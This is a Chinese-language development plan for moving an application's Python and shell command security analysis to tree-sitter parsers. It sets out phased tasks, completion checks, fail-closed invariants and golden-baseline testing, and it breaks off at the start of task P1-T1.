# 脚本安全解析器升级开发方案（tree-sitter 路线）

- 日期：2026-09-19（v13，按评审 v7 修订）
- 依据文档：`docs/analysis/tree-sitter-script-security-parser-analysis.md`（可行性评估，下称「评估文档」）
- 评审记录：v1 评审、v2/v3/v4/v5/v6 复评及历轮后补发现均已落实（`docs/review/` 同名系列）；v11 落实 v5 三项：**发现 E**（bash facts 无基线——`analyzeShellFacts` 消费面含 `runShellPlan.ts:136` 与 `shellConfirmationAdapter.ts:51`，facts 投影直接驱动确认信号与信任键，`analysisCompleteness === 'partial'` 等价 `extraction-failed`）；**发现 F**（已建模清单遗漏运算符族与基础字面量，现状 `binop`/`__compare__`/`__unary__`（`scriptContentSecurity.ts:144/:528/:542/:551`）与 A0 用例 `print(1 + 2)` 证实为现状已支持面）；**发现 G**（§8「bash 裁决 2 次」口径修正为「单次 `analyzeShellCommand` 内」）。**v12 落实 v6 发现 H**（`analysisCompleteness` 的第三后果：`shellToolLoopHelpers.ts:54` → `legacyAutoAllowEligible` → 自动放行 / `skipConfirm` 免确认的 **fail-open** 链路——v11 的 facts 消费面只覆盖了前两个后果）。**v13 落实 v7 两阻断 + 五中低项**：B1（核心 wasm 文件名全文改 `web-tree-sitter.wasm`——0.27.0 包内不存在 `tree-sitter.wasm`）、B2（P2-T2 spy 断言口径收窄为「树事实增强路径内」）、M1（`runShellPlan`/`shellConfirmationAdapter` 目录前缀补全）、M2（测试 setup 三项目共用约束）、L1–L3。
- 执行状态（2026-09-20）：**P0～P3 全部 29 项任务完成**，分支 `feature/script-security-parser-treesitter`（worktree `E:/Develop/SpaceAssistant/.worktrees/script-security-parser`）。
  阶段提交：P0 `9c2df39b` → P1-T0 基线 `004b091c` → P1-T1/T2 `ca462e39` → P1 切换 `e3517a62` →
  P2-T0 基线 `44ca219a`/`e8879b94` → P2-T1 `ff55c151` → P2 收尾 `90288c48` → P3-T0/T1 `aa80538f` → P3 收尾（见分支 git log）。
  Golden 评审：worktree 内 `docs/develop/script-security-parser-upgrade-golden-review.md`（drift 明细 `docs/develop/golden-data/`）。
- 方案性质：开发执行方案。每个任务给出**完成判定（DoD）**——即可独立执行的检查（命令 / 测试名 / 行为断言），满足即判定完成，不依赖主观评审。
- 阶段划分沿用评估文档 §8：P0 基建 → P1 Python 切换 → P2 run_shell Bash → P3 run_shell PowerShell。每阶段独立交付、独立验收。

---

## 1. 目标与范围

### 1.1 目标

1. run_script 的 Python 内容分析从「自研子集解析器」升级为「tree-sitter-python 全语法解析 + IR 适配 + 既有 A/B 规则语义」，消除 `def`/`with`/`try`/dict/f-string 等主流构造落入 `A-fail` 兜底 ask 的问题。
2. run_shell 的内容级分析从「分段 + 正则」升级为「语法级 command facts」（Bash / PowerShell 按 dialect 路由），覆盖命令替换、重定向、管道结构等此前不可见的面。
3. 全程不引入新的 fail-open 面，覆盖三个层面：解析不完整（三类，见 §3 不变量 1）→ `ask` 兜底；持久化信任 / 决策缓存的键不发生等价类合并（§3 不变量 6）；**IR 适配层全量覆盖——「grammar 能解析」不等于「适配器已映射」，未映射节点必须抛错而非静默丢弃**（§3 不变量 7，四分类，保护 Analyzer 黑名单与 RemoteCertifier 白名单双侧）。
4. **禁净退化**：现状（自研解析器）能解析的构造，切换后必须已建模——不得出现「现状能跑、切换后反而落人工」的回归（现状已支持 kwargs `f(x=1)`、运算符族与基础字面量等，见 `scriptContentSecurity.ts:144/:528/:542/:551/:571-578`）。验收见 P1-T1 分类表与 P1-T6。

### 1.2 范围外（明确不做）

- run_script 不增加 `language` 参数，保持 Python-only（评估文档 §4.1）。
- `commandHasShellMetasyntax` 启发式及其「不可持久化信任」语义原样保留，不作为语法级分析的替代面也不被削弱。
- 远程 lane 的 run_shell RemoteCertifier 正向认证复用（二期，本方案不定范围）。
- 策略层（`policyEngine.ts` / `defaultRules.ts`）、UI（`ScriptConfirmCard`）零改动——它们是验收锚点而非改造对象。`toolCallGate.ts` 判定逻辑零改动；仅允许 P1-T3 描述的「传递预解析结果」的最小加法改动（消除重复解析，不改任何判定行为）。
- run_shell 整链路的跨阶段 parse 合并（`electron/tools/runShellPlan.ts:136` plan 阶段与 `analyzeShellCommand` 裁决阶段的 facts 解析合并）不在本方案范围——本方案只保证**单次 `analyzeShellCommand` 内恰好 1 次解析**（P2-T2）；整链合并记录为已知后续优化项。

## 2. 架构与契约锚点

### 2.1 目标四层（与评估文档 §5 一致）

```
① grammar wasm 层   web-tree-sitter@0.27.0（含核心 web-tree-sitter.wasm 运行时）
                     + tree-sitter-python@0.25.0 / tree-sitter-bash@0.25.1
                     / tree-sitter-powershell@0.26.4（全部 wasm vendor 进仓库，锁哈希）
② IR 适配层（新增）  electron/shell/scriptIr/ —— 每语言一个适配器：
                     tree-sitter 语法树 → 跨语言通用事实 IR
                     【全量覆盖四分类：已建模 | 可忽略（叶子）| 结构性穿透（壳）| 抛错】
③ 规则分析层（保留） electron/shell/scriptContentSecurity.ts 的 Analyzer /
                     RemoteCertifier / 模式 ID 体系，改造为消费 IR 而非自研 AST
④ 策略/呈现层（不动）scriptAnalysisExtractor 信号契约、policyEngine、
                     remoteToolPolicy、ScriptConfirmCard 无感；
                     toolCallGate 判定逻辑不动（仅允许 P1-T3 的预解析传参加法）
```

### 2.2 替换面契约锚点（必须逐条保持等价的公开契约）

以下符号被下游硬引用，是 P1 的**等价验收清单**：

| 锚点 | 位置 | 契约 |
| --- | --- | --- |
| `analyzeScriptContent(code, ctx?)` | `electron/shell/scriptContentSecurity.ts:1537` | 同步返回 `{ verdict, patterns, reason? }`；解析不完整（三类，§3 不变量 1）→ `{ verdict:'ask', patterns:['A-fail'], reason:'parse_error' }`；签名与语义均不得改变（允许追加可选参数传递预解析 IR，见 P1-T3） |
| `parsePythonModule(source)` | 同文件 `:655` | 导出名 / 同步性 / 失败时抛出语义不变；**返回类型允许从 `ModuleAst` 变更为 IR 根**（P1-T1 的映射表须覆盖其全部被消费字段），消费者 `scriptAnalysisExtractor.ts:27`（`analyzeOnce`）在同一提交内适配；失败抛出语义涵盖 `ParseError` 与 `IrCoverageError`（适配器未覆盖构造）两类 |
| `collectPatternHits(ast, ctx?)` | 同文件 `:1348` | 产出 `PatternHit[]`，pattern ID 为 A/B 模式字符串；入参类型随 IR 根同步变更 |
| `isScriptCertifiedRemoteSafe(ast)` | 同文件 `:1525` | RemoteCertifier 入口；仅用于 remote `allow`→`ask` 降级，永不升级为 deny；入参类型随 IR 根同步变更 |
| `NETWORK_PATTERN_IDS = new Set(['A6','B10'])` | 同文件 `:53` | 提取器据此产 `script-network` 信号；集合内容逐字不变 |
| 模式 ID 全集 | Analyzer | A0–A9、B1–B11、`A-fail` 字符串逐字不变 |

下游消费契约（验收时回归）：

- `electron/confirmation/extractors/scriptAnalysisExtractor.ts:36` `extractScriptSignals`：verdict→`clean/suspicious/dangerous` 映射；信号 kind 集合 = `script-analysis | script-network | script-uncertified | extraction-failed`。**内部实现允许重构为单次解析（消除 :41 与 :46/:27 的双重 parse），信号输出契约不变；允许追加可选预解析参数（P1-T3），其第二调用点 `runExtractors.ts:27`（descriptor 驱动路径）不传预解析 IR、保留自解析能力**。判定落点由 `extraction-failed` 信号决定（`policyEngine.applyDefault()` 首分支硬编码 `requireConfirm(..., 'user')` → 人工），而非 `patterns` 中的 `'A-fail'` 字符串——适配器抛错必须走完这条通道。
- `src/shared/policy/defaultRules.ts` 脚本相关规则（按文件实际顺序）：`script-network-deny-remote`(:20)、`shell-precheck-auto-allow`(:96)、`script-network-ask-desktop`(:106)、`script-uncertified-ask-remote`(:114)、`script-clean-certified-remote`(:123)、`script-clean-allow-desktop`(:132)。验收承诺为**规则 ID 集合与内容不变**（不以本表顺序作验收依据，文件内实际内容亦不得调整）。

**确认域签名组件与共享原语层的特殊地位（P2/P3 替换面边界）**：

1. `electron/confirmation/extractors/commandSequenceExtractor.ts` 是**平台无关**的确认域组件（`extractCommandSignals` 及其内部函数无 dialect 入参；同时处理 bash 与 PowerShell 动词 `cd|set-location|sl`，按 `_env.os` 选 `path.win32.resolve`/`path.posix.resolve`），其 `normalizeShellSignature`(:21) 被 `decisionCache.ts:46` 与 `exemptionMigration.ts:27` 用于持久化信任匹配——它是缓存键同源组件。
2. **共享原语层同样无 dialect 入参、被双路径共同消费**：`shellAnalyzer.ts:26` 的 `analyzeShellFacts(command, dialect)` 是双方言共享入口（**dialect 参数现状只记录、不分支**，函数体：`:28` 共享 `stripComments` 预处理 → `parseShellSegments`（`shellCommandParser.ts:39`）→ `tokenizeSimpleCommand` 逐段提取）；`commandSequenceExtractor.ts` 也 import 同一模块；`shellPathAnalysis.ts` 的路径提取链（`extractPathLiterals` :39 → 私有 `tokenizeSegment` :71）被 PS 路径可达。**重写这些原语内部 = 同时改变 bash 路径、PS 路径与确认域签名路径的传递行为**。
3. 因此：**P2 期间 `commandSequenceExtractor.ts` 整体不动；`shellCommandParser.ts` 与 `shellPathAnalysis.ts` 的导出（`parseShellSegments`/`tokenizeShellArgv`/`tokenizeSimpleCommand`；`extractPathLiterals`/`analyzeSegmentPaths`/`verifyPathsInWorkDir`/`normalizeWindowsPath`/`detectOutsideWorkDirRisk`）本体行为逐字节不变**（注意：`tokenizeSegment` 是 `shellPathAnalysis.ts` 的**模块私有函数**，不可外部调用、不可单独录基线——基线经导出入口录制，见 P3-T0）。**冻结 = 文件零改动，不禁止调用**：bash 新链路仍可调用这些旧导出承担其既有职责（见 P2-T2 主裁决链设计）。bash 分析路径的分叉与语法化收编分两阶段：P2 增量增强（P2-T2），P3-T4 全面 dialect 双轨（见 §7）。

**`analyzeShellFacts` 的完整消费面（发现 E + H，facts 变化的行为波及面）**：调用点 3 处——`electron/shell/analyzeShellCommand.ts:26`（附加 facts）、`electron/tools/runShellPlan.ts:136`（facts 冻结进 prepareShellExecution plan）、`electron/confirmation/shellConfirmationAdapter.ts:51`（复用 prepared.facts 投影为确认事实）——**投影直接由 facts 驱动**：`operations`/`connectors` → `command-sequence` 信号（含 persistable 信任键）；`paths` → 路径信号；**`analysisCompleteness === 'partial'` → 直接产 `extraction-failed` 信号（按 §3 不变量 1 落人工，fail-closed）**。**`analysisCompleteness` 的第三后果（发现 H，fail-open 方向，v11 遗漏）**：`precheckRunShellTool`（`shellToolLoopHelpers.ts:54-57`）以 `analysis.facts?.analysisCompleteness === 'complete'` 作为 `legacyAutoAllowEligible` 的合取条件之一（其余条件：persistable、无 metasyntax、无 riskAck、命中 allow 规则或信任缓存），该布尔有两处免确认消费——(a) `toolCallGate.ts:447` 的 `shell-precheck-auto-allow` 自动评估器（`approve: true` → 策略层自动放行，**免确认决策本体**）；(b) `toolChatLoop.ts:1787` 与 `:2223-2224` 的**审计留痕点**（`logShellPrecheck` 的 `skipConfirm` 字段与 `logShellConfirmOutcome` 的 `outcome: 'skip_confirm'` / `skipConfirm` 字段——免确认执行的审计记录，非决策点）。**可触发形态（已核对）**：裸括号 `(`/`)` 不在 `commandHasShellMetasyntax` 判定集（`shellCommandParser.ts:9-22`：`[\r\n]`/`` ` ``/`$(`/`${`/`$VAR`/`[|;<>&]`/`[*?]`/赋值前缀；`<>` 已被 `[|;<>&]` 覆盖）内，但旧启发式对 segment 整体测 `/[()]/`（`shellAnalyzer.ts:56`，引号内字符同样命中）判 partial——`echo "a(b)"`（已信任）在旧实现因 partial 而需确认，切换后语法树完整解析 → `complete` → `legacyAutoAllowEligible` 由 false 变 true → 免确认。既有用例 `echo $(pwd)`（`shellToolLoopHelpers.test.ts:106-124`）因 `hasMetasyntax=true` 短路使该布尔恒 false，覆盖不到此形态。因此 bash facts 输出变化 = 确认行为、信任键与**免确认资格**的变化，必须纳入基线比对（P2-T0 facts + 免确认资格派生基线 / P2-T2、P2-T5 比对）。**事实层消费面写全：调用点 3 处 + 派生消费点 1 处（`shellToolLoopHelpers.ts:54`，消费 `analyzeShellCommand` 附带的 facts）。**

**shellPathAnalysis 的可用复用面（核验后的事实）**：`extractPathLiterals`(:39) 的提取与 tokenize 耦合（第一步即私有 `tokenizeSegment` :71），**不可**整体复用于语法树路径；可复用的是**判定侧纯函数**——`verifyPathsInWorkDir`(:113，接收 `ShellPathLiteral[]`，不依赖 tokenizer）、`normalizeWindowsPath`(:11)，以及 `shellSensitivePaths.ts:36` 的 `isSensitivePath` 与敏感前缀表（注意：前缀表不在 `shellPathAnalysis.ts`）。

### 2.3 同步/异步阻抗的决策

web-tree-sitter 要求异步 `Parser.init()` + `Language.load()`，而 `analyzeScriptContent` 是同步函数、被 `toolCallGate.ts:351-361` 同步调用。**决策：初始化前置到应用启动，且三语法在初始化时全量加载（非懒加载）**——

- `ScriptParserService.ensureInitialized(): Promise<void>` 在 `main.ts` app ready 阶段调用，**一次性加载核心运行时 + 全部三个 grammar**（评估文档实测三语法 wasm 加载总耗时 ~11ms；wasm 资产体积约 4–5MB——评估文档 §6.2 的口径是**资产体积而非内存实测**，核心 `web-tree-sitter.wasm` 仅 ~210KB，桌面应用无压力；懒加载与同步 parse 存在「首次解析某语言时 grammar 未加载」的时序矛盾，而懒加载的收益本来就近似为零，故直接消除该窗口）。
- 运行期 parse 为同步调用；若服务未初始化完成（冷启动竞态）或初始化失败，parse 返回 `not_initialized`，产出与 parse 失败等价的 `A-fail`/`parse_error` → ask（fail-closed，方向安全），并按 P0-T4 的可观测性要求记录告警。
- Vitest forks 单 worker 下同样先 `ensureInitialized()`（评估文档 §2 已实测该形态可行）——**归属约束：`src/test/setup.ts` 被 electron / renderer / renderer-perf 三个 vitest 项目共用（`vitest.config.mts` 各 project 均挂载），初始化不得写入共享 setup**（避免 jsdom 渲染测试被拖入 wasm 加载与环境耦合）；采用 **electron 项目专属 setup 文件**（vitest projects 配置为 electron project 单独指定 setupFiles）**或各测试文件 `beforeAll` 内 await**，二选一并在 PR 说明。

## 3. 全局不变量与验收总则

以下规则适用于所有 Phase，写入各阶段收尾门禁：

1. **fail-closed 不变量（解析不完整的三类情形）**：解析不完整分三类，**共同底线：任何一类都不得产出 `clean` 信号或 `allow` 判定**——
   - **(a) `not_initialized`**：解析服务未就绪（初始化未完成 / 失败）→ parse 返回 `not_initialized` → 等价 `A-fail` → ask，并按不变量 8 告警；
   - **(b) `parse_error`**：语法非法或含 ERROR/MISSING 节点 → `A-fail` → ask（脚本侧）；shell 侧等价兜底；
   - **(c) `adapter_uncovered`**：语法合法但 IR 适配器未覆盖该构造 → 适配器抛 `IrCoverageError` → 沿既有 catch 通道（`analyzeOnce` catch → `extraction-failed` 信号 → `policyEngine.applyDefault()` 首分支硬编码 `'user'`）落 **人工确认**。**落点决策（评审 v4 B1‴-c）：选选项 a——复用 `extraction-failed` 通道落人工，不改动 `policyEngine`/`defaultRules` 策略层；「问人还是问审批 Agent」是策略层职责，不下沉到适配器**。代价为沿用 M3 的打扰成本，由 P1-T6 的 `IrCoverageError` 统计监测。
   三类均须有测试覆盖。
2. **Golden 判定对比（基线先行）**：P1/P2/P3 各维护一份 Golden 样本集（脚本或 shell 命令 + 期望判定）。**基线数据（旧实现的判定 / 签名 / facts 输出）必须在替换旧实现之前、在指定的基线 commit 上采集导出**，基线 commit 哈希写入 Golden 评审文档；切换后逐条 diff，**每一条判定变化必须在 Golden 评审记录中登记处置结论**（接受/修复），不允许「测试绿了就过」，也不允许拿切换后实现自证基线。
3. **版本锁死**：`web-tree-sitter@0.27.0` + 三 grammar 版本组合固定写入 package.json（精确版本号，不用 `^`）；任何升级整组进行并跑全量 Golden 回归。
4. **测试纪律**（沿用 AGENTS.md）：开发中只跑定向测试（`npm exec vitest run <文件>` 或 `npm run test:related -- <改动源文件清单>`）；`npm test` 全量仅在 Phase 收尾门禁执行；主进程测试保持 forks 单 worker。
5. **i18n**：本次改动原则上不新增 UI 文案；例外仅两类：(a) P2/P3 新模式需要在确认卡片展示新 pattern 描述文案；(b) P0-T4 的解析降级状态在设置/诊断界面的展示文案。两类均走相应命名空间 + `npm run i18n:generate-types` + `npm run i18n:check`。
6. **信任键等价类不合并（fail-open 防线）**：任何涉及 `normalizeShellSignature` / `parseShellCommandForTrust` / 决策缓存键计算的重构，其输出等价类**只允许拆分、不允许合并**——签名变多至多 over-ask（方向安全），不同命令折叠为同一签名会复用持久化 allow 信任（fail-open，禁止）。判定式为单向蕴含：**新实现输出相同的样本对，旧实现输出必须也相同（新同 ⟹ 旧同）**。四象限：旧同新同＝不变（允许）；旧同新异＝拆分（允许）；旧异新异＝重排（允许，需登记）；旧异新同＝合并（禁止，判红）。注意反向不成立也不要求：**输入不同不蕴含签名应不同**——空白/引号变体本就该归一化为同一签名，这是签名归一化的功能而非缺陷。**签名路径的解析失败 fallback 不得把失败输入折叠为常量/空签名**——那等价于全体失败输入合并为同一等价类（禁止）；fallback 的正确验收是「与旧实现输出逐字节一致」（fallback 语义本就是回退旧实现）。验收方式见 P2-T0（签名基线）/ P2-T3（签名归一化 Golden）/ P3-T4（确认域组件与共享原语层 dialect 双轨的 fallback 语义）。
7. **IR 适配器全量覆盖（四分类，fail-open 防线，保护 Analyzer 与 RemoteCertifier 双侧）**：tree-sitter 能解析 ≠ 适配器已映射；且 CST 含大量**壳节点**（不表达语义、只搭结构的容器，如 `argument_list`/`parameters`/`block`）。IR 适配器遍历时，每个节点种类必须属于**四者之一**：
   - **①已建模**：映射进 IR（产出事实）。**清单为下限非上限**：已建模必须覆盖 P1-T0「现状可解析集」所需的全部节点种类（含运算符族 `binary_operator`/`comparison_operator`/`boolean_operator`/`unary_operator`/`not_operator` 与基础字面量 `integer`/`float`/`true`/`false`/`none`——现状 `binop`/`__compare__/__unary__` 已支持，`print(1 + 2)` 是 A0 用例）；清单未列但为现状可解析集所需的种类，必须补入 ① 而非落 ④；
   - **②可忽略**：白名单常量，**判据：仅限叶子/无子节点的无语义 token 种类**（标点、注释、关键字）；
   - **③结构性穿透（壳节点）**：**显式列名**于分类表（仍不许静默）、自身不产生事实、递归处理子节点。**准入判据：该种类自身不携带语义、仅作结构分组，且不含以字段名（field name）承载语义的子节点**——`keyword_argument`（`name` 字段承载 kwargs 归属，`scriptContentSecurity.ts:1324` 真实消费）、`slice`、`list_splat`、`dictionary_splat`、`named_expression` 等**语义容器显式禁入 ③**（即使其名称不含安全关键词；穿透它们会把 `b=1` 拆成位置参数，污染 args/kwargs 归属）。每条 ③ 带 justification 注释。**机械护栏分两层**：(i) 名称黑名单（`call|attribute|subscript|assign|import|await|yield|lambda|operator` 等种类禁入 ③）；(ii) 语义容器禁入清单（上述种类，分类表内显式标注）。**护栏性质声明：机械护栏只是防手滑，真正的兜底是 P1-T5 判定 Golden 比对与 P1-T2 的 IR 结构快照 / 穿透归属断言——不得把护栏测试全绿误读为「③ 分类正确性已保证」**；
   - **④其余一律抛出 `IrCoverageError`**（即不变量 1 的 (c) 类，落人工）。
   **禁止「静默跳过未识别节点」、禁止降级为「无此事实」**——那会让危险调用从 Analyzer 黑名单（漏命中 → patterns 空 → `allow`/`clean` → `script-clean-allow-desktop` 免审放行）与 RemoteCertifier 白名单（看不到 → 认证通过 → 远程 fail-open）双侧同时逃逸。**分类边界由 P1-T1 的节点分类表定义**（每个 named 节点种类的四类归属对号入座，含 P1-T0 样本集每个构造）；并服从**禁净退化**子规则：**现状解析器能解析的构造必须归入「已建模」**（§1.1-4）——`f(1,2)`/`def`/`if`/`for` 这类含壳节点的普通构造经 ③ 穿透后正常产 IR，不落 ④。完整性由 node-types.json 穷尽性测试强制（P1-T2），未知构造与包裹式反向用例强制（P1-T2）。
8. **运行期降级可观测**：初始化失败 / 自检失败 / 运行期 `not_initialized` 不得只落日志后静默退化，必须满足 P0-T4 的告警与状态暴露要求。

---

## 4. Phase P0：tree-sitter 基建

**阶段目标**：web-tree-sitter + 三语法 wasm 进仓库（含核心运行时 wasm），ABI/体积/真实解析能力在首个任务即验证，`ScriptParserService` 可用（含自检与降级告警），打包链路可分发全部 wasm，fuzz 回归就位。此阶段**不改变任何运行时判定行为**。

### P0-T1 引入依赖、锁版本并前移真实解析探测

- 内容：`npm install web-tree-sitter@0.27.0 tree-sitter-python@0.25.0 tree-sitter-bash@0.25.1 tree-sitter-powershell@0.26.4 --save-exact`；新增 `scripts/probe-treesitter.mjs`：从 node_modules 加载 4 个 wasm，对三语言各解析一份真实样本，断言 0 ERROR，打印各 grammar 的 ABI/language version 与 4 个 wasm 的字节体积。
- 完成判定：
  - package.json 中四个包均为精确版本号（无 `^`），`npm ls` 通过。
  - `node scripts/probe-treesitter.mjs` 退出码 0，输出含三语言样本解析成功、ABI 版本（须在 web-tree-sitter@0.27.0 支持的 ABI 13–15 区间内，评估文档 §3）与体积清单。
  - **体积预算**：4 个 wasm 合计 ≤ 6MB（评估文档口径 4–5MB；其中核心运行时 `web-tree-sitter.wasm` 仅 ~210KB，四包合计约 3MB 量级，预算裕量充足）；超出则记录并触发评审，不静默放行。实测体积写入评审/验收记录。
  - `node -e "const P=require('web-tree-sitter'); console.log(typeof P)"` 成功（CJS 形态可 require）。

### P0-T2 vendor wasm 资产 + 哈希锁定（含核心运行时 wasm）

- 内容：把 wasm 资产拷贝到 `resources/tree-sitter/`（新目录），共 **4 个文件**：
  - 三个 grammar wasm：各 grammar 包内的 `tree-sitter-python.wasm` / `tree-sitter-bash.wasm` / `tree-sitter-powershell.wasm`；
  - **核心运行时 wasm：`web-tree-sitter` 包内的 `web-tree-sitter.wasm`**（`Parser.init()` 加载目标，emscripten 运行时；**0.27.0 包内实际文件名即 `web-tree-sitter.wasm`（~210KB），不存在 `tree-sitter.wasm`**——unpkg 文件清单已核实，vendor 与 `locateFile` 均以此名为准）。
  同时把三个 grammar 的 **`node-types.json`** 一并 vendor（供 P1-T2 穷尽性测试做节点种类全集对照；若 npm 包内不含该文件则从对应版本上游仓库取同版本文件，来源记录在 SHA256SUMS 注释）。生成 `resources/tree-sitter/SHA256SUMS.txt` 记录全部文件哈希；新增 `scripts/check-treesitter-wasm.mjs` 校验脚本（不符即非零退出）；注册为 `npm run check:treesitter-wasm`，并挂入 CI test job（参照 `check:no-nul` 的挂法）。
- 完成判定：
  - `resources/tree-sitter/` 下存在 4 个 wasm + 3 个 `node-types.json` + `SHA256SUMS.txt`。
  - `npm run check:treesitter-wasm` 退出码 0；手工篡改任一受控文件后退出码非 0（验证后还原）。
  - `.gitattributes` 对 `*.wasm` 标记 binary（防止换行符转换破坏哈希）。

### P0-T3 实现 `ScriptParserService`（初始化时全量加载，非懒加载）

- 内容：新建 `electron/shell/scriptParserService.ts`：
  - `ensureInitialized(): Promise<void>` —— 初始化 web-tree-sitter 核心运行时（`Parser.init()`，核心 wasm 定位优先尝试 `locateFile` 形态指向 `resources/tree-sitter/web-tree-sitter.wasm`；**评估文档实测记录仅覆盖默认加载形态，若 `locateFile` 重载在 0.27.0 不可用，退路为：构建/安装期把核心 wasm 复制到 web-tree-sitter 默认查找位置，或以 Emscripten Module 覆盖方式注入——无论哪种形态，「4 个 wasm 出 `resources/tree-sitter/`、哈希受 `SHA256SUMS.txt` 管控」的目标不变**），随后**同步加载全部三个 grammar**（消除「懒加载 × 同步 parse」的首次调用窗口，见 §2.3）；幂等。
  - `parse(language: 'python'|'bash'|'powershell', source: string): ParseOutcome` —— 同步；`ParseOutcome = { ok: true; tree } | { ok: false; reason: 'not_initialized'|'parse_error' }`；ERROR/MISSING 节点检测（`hasError` 等）归入 `parse_error`。
  - `getStatus(): { ready: boolean; failedReason?: string; notReadyParseCount: number }` —— 供诊断/告警消费（P0-T4）。
  - wasm 路径解析：核心运行时与 grammar 统一走 `resolveTreeSitterWasmPath(fileName)`，开发态指向 `resources/tree-sitter/`，打包态指向 `process.resourcesPath/tree-sitter/`（参照 `electron/tools/ripgrepBinary.ts` 的双态定位模式）。
  - 测试初始化归属：`ensureInitialized()` 的 await 走 **electron 项目专属 setup 或测试文件 `beforeAll`**——`src/test/setup.ts` 为三项目共享，不得写入（§2.3 归属约束）。
- 完成判定：
  - `electron/shell/scriptParserService.test.ts` 通过（Vitest electron project），至少含：初始化幂等、**初始化完成后三语言立即可 parse（无首调用 not_initialized）**、三语言各一个合法样本 `ok:true`、未初始化调用返回 `not_initialized` 且 `getStatus().notReadyParseCount` 递增、含语法错误的样本返回 `parse_error`（Python `def f(:`；Bash 未闭合引号；PowerShell 非法 token）。
  - `npm exec vitest run electron/shell/scriptParserService.test.ts` 全绿。

### P0-T4 启动链路接入初始化 + 自检 + 降级可观测（对应 §3 不变量 8）

- 内容：`electron/main.ts` app ready 阶段调用 `ensureInitialized()`（fire-and-forget，不阻断启动），随后做**启动自检**：对三语言各解析一条探针样本并断言 `ok:true`。失败处理与运行期告警：
  - 初始化/自检失败 → 写 **error 级、事件名可 grep 的日志**（如 `treesitter.init.failed` / `treesitter.selfcheck.failed`，经 `logSanitize` 脱敏）。
  - **状态暴露链路（含 DoD，闭环而非口号）**：新增 IPC 通道（如 `treesitter:get-status`）——`electron/preload.ts` 暴露、`src/shared/api.ts` 加类型、主进程 handler 返回 `ScriptParserService.getStatus()`；设置/诊断界面做**最小展示**（解析不可用时显示「脚本安全解析不可用，判定已全部降级为人工确认」，文案走 §3 不变量 5 例外 (b) 的 i18n 流程）。这与「UI 零改动」的张力显式消解：零改动对象是 `ScriptConfirmCard` 等确认呈现；本项是诊断展示的必要新增。
  - 运行期每次因 `not_initialized` 落入 ask 兜底时，**每会话首次**写 warn 级日志（如 `treesitter.parse.not_ready`），避免静默永久退化只存在于日志噪声中。
- 完成判定：
  - `npm run build:electron:incremental` 通过。
  - 代码评审点：`main.ts` 中 `ensureInitialized` 调用存在 `.catch`；自检逻辑存在；两类日志事件名可在 `rg "treesitter\." electron/` 中命中。
  - **IPC DoD**：`rg "treesitter:get-status" electron/preload.ts src/shared/api.ts electron/appIpc.ts`（或实际注册文件）命中三处；handler 定向测试断言返回形状 `{ ready, failedReason?, notReadyParseCount }`；`npm run typecheck:renderer` 与 `npm run i18n:check` 通过。
  - 定向测试：模拟 wasm 路径缺失，断言初始化失败产生 error 日志事件且 `getStatus().ready === false`；模拟未初始化调用 parse，断言首条 warn 日志产生且不重复刷写。

### P0-T5 畸形输入 fuzz 回归

- 内容：`electron/shell/scriptParserService.fuzz.test.ts`——确定性伪随机种子（mulberry32）对三语言各生成 ≥500 份畸形/截断/二进制噪声输入，断言：parse 调用不抛未捕获异常、不超时（单份 < 1s）、返回值必为 `ParseOutcome` 两种形态之一。
- 完成判定：
  - `npm exec vitest run electron/shell/scriptParserService.fuzz.test.ts` 全绿，且测试文件内断言了上述三条不变量（评审点）。

### P0-T6 打包链路分发全部 wasm（4 个文件）

- 内容：`package.json` 的 `build` 字段新增：`extraResources` 把 `resources/tree-sitter/`（4 个 wasm + 3 个 node-types.json）拷到产物 `resources/tree-sitter/`（与 `resolveTreeSitterWasmPath` 打包态路径一致）。更新 `scripts/after-pack.cjs`（如需）或新增轻量校验：打包后检查产物内受控文件存在且哈希与 `SHA256SUMS.txt` 一致。
- 完成判定：
  - `npm run pack:win` 成功后，`release/win-unpacked/resources/tree-sitter/` 下 **4 个 wasm（含核心 `web-tree-sitter.wasm`）**存在，哈希与清单一致（可写一次性脚本验证或手工 `sha256sum` 比对并记录到验收记录）。
  - 打包产物启动后 `ScriptParserService` 初始化与自检成功（核心 wasm 可达是前提）；验证方式（自检日志事件 `treesitter.selfcheck.*` 或手动解析探针）记录到验收记录。

### P0-T7 主进程类型解析验证

- 内容：确认 `tsconfig.electron.json`（`moduleResolution: "Node"`）下 `import Parser from 'web-tree-sitter'` 类型可解析；必要时在 `electron/types/` 加最小 `.d.ts` 补声明。
- 完成判定：`npm run build:electron`（全量）通过，无 web-tree-sitter 相关 TS 错误。

**P0 阶段收尾门禁**：P0-T1～T7 全部达成 + `npm test` 全量绿（确认未改变任何既有判定）+ 提交。

---

## 5. Phase P1：Python 前端切换

**阶段目标**：run_script 的 Python 解析前端换成 tree-sitter-python；既有 A/B 规则语义与 RemoteCertifier 通过 IR 适配器续用；适配器全量覆盖（§3 不变量 7，四分类）且**禁净退化**（§1.1-4）；行为变化全部经 Golden 评审。

### P1-T0 基线采集（首任务，先于一切代码改动）

- 内容：在**未改动的基线 commit（当前 main HEAD，哈希写入 Golden 评审文档）**上完成：
  1. 建立 Golden 样本集 `electron/shell/testdata/golden/python/`（样本 `.py` + 判定结果的 `.json`），来源：(a) 现有 List A/B/R 用例脚本固化；(b) 新增「原子集解析必失败」样本集（dict/f-string/with/try/def/类/装饰器/async/lambda/下标各 ≥2 条）。样本总数 ≥ 80 条。**每条样本标注「旧实现是否解析成功」**——(a) 组与现有测试覆盖的构造属「现状可解析集」（禁净退化子集，§1.1-4），(b) 组属「原必失败集」（P1-T6 的改善度量对象），两组分别统计。
  2. 实现 Golden 测试 `electron/shell/scriptGolden.test.ts` 的**录制模式**（如 `GOLDEN_RECORD=1 npm exec vitest run electron/shell/scriptGolden.test.ts`）：对每条样本跑 `analyzeScriptContent` + `extractScriptSignals`，把旧实现的 `{ verdict, patterns, signals }` 写入样本 `.json` 作为基线。
  3. 新建 `docs/develop/script-security-parser-upgrade-golden-review.md`，记录基线 commit 哈希与采集时间。
- 完成判定：
  - 基线 `.json` 全部由旧实现导出：评审文档记录基线 commit 哈希与 `git show -s --format='%H %ci' <基线哈希>` 输出；开始改动后可用 `git merge-base --is-ancestor <基线哈希> HEAD` 佐证基线先于改动；
  - 录制模式在基线 commit 上跑通，样本数 ≥ 80 且每条均有基线判定与「旧实现是否解析成功」标注；
  - `script-security-parser-upgrade-golden-review.md` 已建立「Python 段」，基线信息入库。

### P1-T1 定义跨语言事实 IR + 节点分类表（四分类）

- 内容：
